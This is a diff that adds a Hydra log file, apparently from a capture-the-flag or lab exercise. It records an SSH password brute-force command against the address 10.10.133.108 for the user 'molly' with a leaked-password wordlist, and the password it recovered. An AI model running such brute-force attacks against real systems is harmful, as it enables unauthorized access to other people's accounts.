@@ -1,0 +1,2 @@
+# Hydra v8.6 run at 2021-06-23 18:37:19 on 10.10.133.108 ssh (hydra -l molly -P /opt/SecLists/Passwords/Leaked-Databases/rockyou-75.txt -o ssh-pass.hydra 10.10.133.108 ssh)
+[22][ssh] host: 10.10.133.108   login: molly   password: butterfly
